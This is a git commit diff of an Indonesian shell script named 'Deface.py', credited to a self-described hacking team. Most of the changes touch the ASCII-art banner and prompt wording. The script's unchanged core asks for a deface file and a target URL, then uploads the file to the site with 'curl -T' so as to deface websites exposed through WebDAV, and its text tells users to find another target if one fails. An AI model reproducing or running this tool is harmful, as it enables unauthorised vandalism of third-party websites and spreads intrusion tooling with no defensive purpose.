2b75f1256e96b8c582ae1851b97d48c794198fda
Mr.TamfanX <62769928+Anonymous3-SIT@users.noreply.github.com>
2020-03-31 23:10:24 +0700

    Update Deface.py

--- Deface.py
+++ Deface.py
@@ -4,8 +4,16 @@
 # Selamat Menikmati :V
 
 clear
-toilet -f future '    SIT - DEFACE' | lolcat
 echo
+echo
+cowsay -f eyes "SHUTDOWN INDO TEAM" | lolcat
+echo
+toilet -f future '    DEFACE' | lolcat
+echo
+neofetch
+echo -e '003[01;32m'
+date
+echo -e '\003[01;32m'
 echo 'Creator  : Mr.TamfanX' | lolcat
 echo 'Team     : SHUTDOWN INDO TEAM' | lolcat
 echo 'Github   : https://github.com/Anonymous3-SIT' | lolcat
@@ -14,16 +22,16 @@ echo 'Gmail    : anonymoussit36@gmail.com' | lolcat
 echo
 echo '''
 SCRIPT INI BERFUNGSI UNTUK MENDEFACE WEBSITE
-YANG VULN / RENTAN TERHADAP BUG WEBDAV
+YANG VULN / RENTAN TERHADAP BUG DEFACE
 ''' | lolcat
 echo
 echo 'Example : index.html' | lolcat
-echo '_:: NAMA SCRIPT DEFACE KALIAN ::_' | lolcat
+echo '_::> NAMA SCRIPT DEFACE KALIAN <::_' | lolcat
 echo
 read sc
 echo
 echo 'Example : http://site.com' | lolcat
-echo '_:: SITE TARGET KALIAN ::_' | lolcat
+echo '_::> SITE TARGET KALIAN <::_' | lolcat
 echo
 read target
 echo
@@ -35,7 +43,7 @@ curl -T /storage/emulated/0/$sc $target
 echo 'HASIL : '$target/$sc | lolcat
 echo '''
 JIKA HASILNYA TERDEFACE BERARTI WEBSITE
-TERSEBUT VULN WEBDAV. JIKA TIDAK, CARI TARGET
+TERSEBUT VULN. JIKA TIDAK, CARI TARGET
 YANG LAIN :)
 ''' | lolcat
 
